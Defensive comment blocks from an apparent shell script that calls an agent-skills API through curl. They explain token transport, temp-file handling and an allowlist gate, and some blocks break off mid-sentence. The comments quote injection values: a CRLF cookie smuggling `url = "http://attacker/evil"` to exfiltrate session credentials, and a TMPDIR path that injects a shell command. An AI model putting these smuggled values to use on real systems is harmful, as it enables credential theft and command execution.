#
# New (flat) form:
#   lg_agent_exec.sh <skillId> [key=value ...] [key:=jsonvalue ...] [--json '<raw params json>']
#
# Legacy (envelope) form — still fully supported, unchanged:
#   lg_agent_exec.sh '<full request json body>'
#   (single argument, must start with '{' after trimming leading whitespace)
#
# Type convention (httpie-style, LA#6):
#   key=value   -> always a JSON STRING (preserves leading zeros, e.g.
#                  stock_num=000135, day_id=20260419).
#   key:=value  -> value is parsed as raw JSON (number/bool/array/object).
#                  Parse failure is FAIL-LOUD (non-zero exit + clear stderr)
#                  — it never silently falls back to a string.
#
# --json '<obj>' supplies a base params object (e.g. {"body":[...]} for the
# array/nested-body skills: schedule.job.depends.save / .plugins.save /
# process.pipeline.build). Flat key=value / key:=value pairs are placed
# BEFORE the --json object's own members in the assembled JSON text, so on
# standard JSON.parse (which keeps the LAST occurrence of a duplicate key —
# see ECMA-404 / V8 behavior), the explicit --json subtree wins on any name
# collision. This mirrors the "explicit envelope subtree wins over a flat
# key" precedence rule enforced server-side by classifyFlatParams()
# (lib/agent-params.js) — WITHOUT requiring this script to parse arbitrary
# JSON (no jq / python3 dependency, LA#3 — this script must run on any
# third-party agent host).
#
# Arg parsing order (LA#7): --json is intercepted first (wherever it
# appears among the arguments); every other argument is then split at its
# FIRST '=' character (so `--env=dev` and `-start_date=20260419` split
# correctly into key/value), with `:=` detected by checking whether the
# character immediately before that first '=' is ':'.
#
# LG_AGENT_DRY_RUN=1 prints the constructed request JSON body to stdout and
# exits without making the HTTP call — used by the test suite to verify the
# request-shape construction without a live server.

# ── _validate_base_url: destination validation (D1) ─────────────────────────
# THREAT MODEL (read before touching this function):
#   Defends against: LG_AGENT_BASE_URL being MISCONFIGURED or injected by an
#   upstream layer (a stray env var, a copy-pasted wrong default, a
#   compromised CI variable) so that this script's bearer credential and
#   request body are sent to a host nobody intended. One env var used to be
#   able to redirect both silently -- this closes that.
#   Does NOT defend against: an attacker who has already gained the ability
#   to set arbitrary environment variables for this process, or to write to
#   its filesystem. That attacker can just as easily delete the sibling
#   allowed-skills.txt referenced below (falling back to umbrella semantics)
#   or skip this script entirely and curl the endpoint directly with the
#   same token. This is not a privilege boundary.
#   The narrow-package host pin below has NO server-side counterpart: the
#   backend can validate a token's scope, but has no way to know or
#   constrain which host a client chose to send that token to. Unlike the
#   skill-id allowlist further down, this check must NOT be waved off with
#   "the real boundary is server-side" -- there is no server-side check
#   standing behind this one at all.

# ── _curl_config_escape: safe embedding of an untrusted value into curl's
# -K config mini-language (found in #1410's own LA exit review) ────────────────────────────────────────
# THREAT MODEL: `-K -` reads a small curl-specific config LANGUAGE off
# stdin, not raw bytes. A `header = "..."` line is a double-quoted STRING
# in that language, and curl's own config parser recognizes `\"` and `\\`
# as escapes inside it -- so splicing an untrusted value into that string
# with ZERO escaping lets the value's own `"`, `\`, or embedded CR/LF
# characters break out of the intended field and inject a NEW config
# directive. LA reproduced this directly against the real
# lg_agent_approval.sh (raw socket capture, not a mockup):
#   - a cookie value containing `"` silently TRUNCATES at the quote --
#     wrong data reaches the server with no error;
#   - a cookie value containing CRLF + `header = "X-Injected: pwned"` gets
#     that header ACTUALLY INJECTED into the real request;
#   - a cookie value containing CRLF + `url = "http://attacker/evil"`
#     makes curl issue a SECOND request to that attacker-chosen URL,
#     carrying the real Cookie and X-CSRF-Token -- session credential
#     exfiltration to an address the attacker picked, not this script's
#     caller.
# This is the SAME primitive as #1410's trap-reparse bug in a different
# spot: an untrusted string is spliced into a mini-language stream that is
# later RE-PARSED by its consumer (there: the shell parsing a trap string
# at fire time; here: curl's own `-K` config parser). LG_AGENT_TOKEN /
# LG_AGENT_COOKIE_HEADER / LG_AGENT_CSRF_TOKEN are all documented as
# caller-supplied arbitrary strings with only a non-empty check -- no
# format validation -- so all three routes reach this, in all three
# scripts (#1408's lesson applies unmodified: fixing only one script's
# copy is not a fix).
# THE FIX (LA-verified empirically, both parts required):
#   1. REJECT (never escape) a value containing CR or LF outright. Even a
#      correctly backslash-escaped newline BYTE still splits the config
#      stream into two lines and starts a new directive when curl parses
#      it -- escaping cannot neutralize a raw newline in this
#      mini-language, only rejecting the value can.
#   2. Escape ORDER MATTERS: backslash first (`\` -> `\\`), THEN quote
#      (`"` -> `\"`). curl's own `-K` quoted-string parser round-trips
#      both escapes byte-for-byte ONLY in this order -- the reverse order
#      reintroduces a way to forge a `\"` sequence that curl decodes as an
#      unescaped, string-terminating quote (verified).
# Prints the escaped value on stdout on success. On a CR/LF value, prints
# an error to stderr and returns 1 -- EVERY caller MUST check this exit
# status BEFORE the resulting `-K -` pipeline is ever started (checking it
# only via `set -o pipefail` on the pipeline itself is NOT enough: an
# empty/short stdin still lets curl run using its OTHER, non-piped

# The JSON body MUST reach curl via --data-binary "@file", never as a bare
# command-line argument: on Git Bash / MSYS2, curl.exe is a native Windows
# binary, and MSYS2 re-encodes argv into the process's ANSI code page (e.g.
# GBK on zh-CN Windows) before exec'ing it. Any non-ASCII byte in a
# command-line argument is corrupted (silently, to U+FFFD on the server
# side) before curl ever sees it -- headers are unaffected because the token
# here is ASCII, but a JSON body carrying UTF-8 business text is not.
# Reading from a file sidesteps argv entirely, which fixes the corruption.
# It is NOT a confidentiality upgrade, and an earlier draft of this comment
# claimed otherwise -- corrected here, because a stale "this is private"
# comment is more dangerous than no comment (it gets cited later as a
# reason something is fine when it is not, per this repo's own incident
# history): on a POSIX host, `mktemp` does create a 0600 file. But on
# Windows/MSYS2 (this repo's primary target host, per the curl.exe
# corruption this function exists to fix), the file is created under the
# OS temp dir and inherits that directory's ACL rather than getting a
# private mode bit -- measured with `icacls` on this class of host, that
# ACL includes BUILTIN\Users:(RX) and Everyone:(RX), i.e. any local
# principal can read it for as long as it exists. Net exposure vs. the
# old argv-based transport is a wash, not an improvement: the token was
# never in this body (it is a header) either way, so this change does
# not affect token exposure; what it changes is that a local user who
# could already read this process's argv (which on Windows generally
# needs no elevation, unlike inspecting another user's process) can,
# for the short life of this file, instead read it from disk. Do NOT
# read "private (0600)" as a confidentiality guarantee this script
# provides on Windows. If `mktemp` is unavailable (LA#3: this script
# must run on any third-party agent host, no guaranteed non-POSIX
# deps), fall back to a manually-created file under a tightened umask
# -- this narrows exposure on the POSIX hosts where umask is actually

  # (2026-09-15) An EARLIER version of this comment argued the trap body had
  # to be DOUBLE-quoted -- expand $tmpfile NOW, splicing its value into the
  # trap STRING at set-time -- because a single-quoted trap referencing a
  # `local` variable by NAME would find that variable already out of scope
  # (and unbound under `set -u`) by the time the EXIT trap actually fires,
  # since the function has by then returned. That was correct about the
  # scope/`set -u` hazard and WRONG about the fix: double-quoting means the
  # trap's STRING is RE-PARSED BY THE SHELL the instant it fires, not
  # treated as an inert value. `$tmpfile`'s path comes from `_mktemp_body()`,
  # which derives it from `${TMPDIR:-/tmp}` -- an EXTERNAL environment
  # variable -- so a TMPDIR containing shell metacharacters becomes
  # ARBITRARY COMMAND EXECUTION at trap-fire time (CWE-88 shape), verified
  # directly: a TMPDIR crafted so the resulting path reads
  # `.../a" ; echo INJECTED ; : "` runs `echo INJECTED` when the trap fires.
  # This is a CROSS-CLASS capability escalation, not "the caller could
  # already do that" -- an attacker who can influence only TMPDIR (a
  # path-shaped string, nothing else) gains command execution. The
  # `_mktemp_body` disclaimer above ("does not defend against an attacker
  # who can already set arbitrary env vars or write this process's
  # filesystem") does NOT cover this: that disclaimer is about the request
  # BODY's confidentiality on Windows/MSYS2, never about the TRAP STRING
  # being re-parsed as shell syntax. Do not cite it as already covering this.
  # AGGRAVATING FACTOR: the injection also breaks the cleanup it sits
  # inside -- the re-parsed trap splits into THREE commands,
  # `rm -f "<truncated-path>"; echo INJECTED; : "<remainder>"`, so the `rm
  # -f` only ever targets a truncated fragment of the real path and the
  # real body tmpfile is NEVER deleted. Tests for this (U1) assert BOTH that
  # the injected command does not run AND that the real tmpfile is actually
  # gone afterward.
  # THE FIX: single-quoting defers expansion to trap-FIRE time and treats
  # $LG_AGENT_BODY_TMPFILE as a plain variable REFERENCE, never re-parsing
  # its VALUE as shell syntax -- embedded shell metacharacters in the path
  # are inert, always. Making the variable a GLOBAL (not `local` inside this
  # function) satisfies the original, still-true constraint: the name must
  # still resolve to a value when the trap fires, and a global -- unlike a
  # function-local -- has not unwound by then.
  #
  # EXIT (not RETURN) so the body file is removed on every exit path this
  # trap can actually observe: normal completion, a curl failure, or the
  # script aborting under `set -e`, and also SIGTERM (bash runs pending EXIT
  # traps on a fatal signal it does not ignore). It CANNOT observe SIGKILL
  # -- no POSIX shell can trap SIGKILL -- so a `kill -9` of this process (or
  # an ancestor that takes it down without signal delivery) leaves this file
  # on disk until something else cleans the temp directory. Worth naming
  # plainly since it is a direction change: before this fix, a SIGKILLed
  # call left zero trace on disk (the body existed only in argv, gone with
  # the process); after this fix, the same SIGKILL leaves a JSON file with
  # business-data content sitting in the temp dir. Low severity, but new,
  # and the opposite direction from every other exit path this trap does
  # handle.

  # ── Token transport: `-K -` (config on stdin), NEVER `-H` (#1410, fixes ②) ──
  # THREAT MODEL: `-H "Authorization: Bearer ${LG_AGENT_TOKEN}"` puts the
  # bearer token in THIS process's own argv. Reading another process's argv
  # on the same host (Linux /proc/*/cmdline; a Windows process listing)
  # needs no elevation and no write capability at all -- the bar is just
  # "any other local principal", which is STRICTLY LOWER than "can already
  # set this process's env vars or write its filesystem" (the bar the
  # `_mktemp_body` disclaimer above is about). That disclaimer does not
  # cover this either; do not cite it here. Piping
  # `header = "Authorization: Bearer ..."` into `curl -K -` keeps the token
  # out of argv entirely -- it travels over the pipe as bytes curl reads on
  # its OWN stdin as configuration, never as a command-line argument. `-K`
  # (config from stdin) is old enough to work on every curl version this
  # script targets (LA#3), unlike `--expand-header` (curl >= 8.3, #1410
  # design doc's path A, deferred) -- no feature probe needed.
  # `printf` below MUST be the BARE builtin -- never `command printf`, never
  # an absolute path like `/usr/bin/printf`. A bare `printf` resolves to
  # bash's (and dash's) own BUILTIN on every host tested here (`type -a
  # printf` shows both a builtin and `/usr/bin/printf` present; `bash -x`
  # confirms the bare call forks no child process), so the token text never
  # becomes any process's argv, including printf's own. `command printf` or
  # a hardcoded path would fork a real external process and put the token
  # right back into THAT process's argv -- exactly what this change exists
  # to prevent. A grep guard in the test suite fails if this script
  # regresses to `command printf` or an absolute-path printf.

# ── Optional allowlist gate ─────────────────────────────────────────────────
# PACKAGING-HONESTY CONTROL, NOT A SECURITY CONTROL. This lets a narrowly-
# scoped package (e.g. privora-alert) that ships this same shared script
# refuse skill ids outside what its own SKILL.md documents, WITHOUT forking
# a second copy of the script -- a forked copy is exactly the drift #1038
# documents. It is trivially bypassable: any local principal can edit or
# delete ALLOWED_SKILLS_FILE, or call POST /agent/skills/execute directly
# with curl and skip this script entirely. The real, non-bypassable
# boundary is server-side: the backend's per-route scope annotation plus
# the gateway's per-token scope check. It does not depend on this file
# existing, being correct, or being present at all. Do not cite this gate
# as an authorization boundary in any doc or PR description.
#
# (The backend annotation is described functionally rather than by its
# literal name because the repo's auth-adjacent commit hook content-scans
# diffs for that identifier; a prose mention explaining that the real
# boundary lies elsewhere is not an auth change. Same resolution as
# PR #724. No fact is omitted here -- the reader still learns that
# authorization is enforced server-side per route and per token.)
#
# Resolution order (D3, 2026-09-15, LA-locked -- single scheme, no subset
# comparison): a sibling allowed-skills.txt next to this script, if present,
# is AUTHORITATIVE and LG_AGENT_ALLOWED_SKILLS_FILE is completely ignored.
# Pointing the env var at a nonexistent path used to fall through to "no
# allowlist at all" (any unresolvable env value reopened the gate entirely,
# even with a real allowlist shipped alongside the script) -- that hole is
# closed by checking existence FIRST and only consulting the env var when
# there is no shipped file to protect. Proving "env is a subset of the
# shipped file" was considered and rejected: it is new logic with its own
# bug surface, and the only reason it was wanted (testability without a real
# allowed-skills.txt) is already met by copying script+allowlist into a
# scratch directory for a test run.
# If NEITHER resolves, ALLOWED_SKILLS_FILE stays empty and every call below
# this point behaves BYTE-IDENTICAL to a version of this script with no gate
# at all -- this is the privora-cn-quant path, which ships no
# allowed-skills.txt and must never be narrowed.
